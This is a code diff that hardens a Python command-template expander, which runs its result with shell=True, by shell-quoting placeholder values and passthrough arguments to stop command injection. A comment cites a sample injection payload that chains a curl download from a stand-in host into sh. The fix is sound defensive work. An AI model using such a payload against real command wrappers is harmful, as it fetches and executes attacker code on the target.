@@ -11,6 +11,7 @@ import json
 import logging
 import os
 import re
+import shlex
 import shutil
 import subprocess
 import sys
@@ -1320,15 +1321,21 @@ def expand_command(
                 raise ValueError(f"Missing required argument '{placeholder.name}'")
 
     # Substitute placeholders in template
+    # The expanded string is run with shell=True, so every value that comes from
+    # a caller (placeholder values and passthrough/extra args) is shell-quoted to
+    # prevent injection (e.g. `&& curl evil | sh`). The template itself is trusted
+    # (defined at registration) and is left intact so it may carry intentional
+    # shell syntax. Note: a placeholder value is now a single shell token — a
+    # value like "-k foo" no longer splits into two arguments.
     result = template
     for match in _PLACEHOLDER_PATTERN.finditer(template):
         name = match.group(1)
-        result = result.replace(match.group(0), values[name], 1)
+        result = result.replace(match.group(0), shlex.quote(values[name]), 1)
 
-    # Append extra args
+    # Append extra args (each quoted so passthrough args stay literal argv tokens)
     all_extra = remaining_positional + (extra_args or [])
     if all_extra:
-        result = result + " " + " ".join(all_extra)
+        result = result + " " + " ".join(shlex.quote(arg) for arg in all_extra)
 
     return result
 
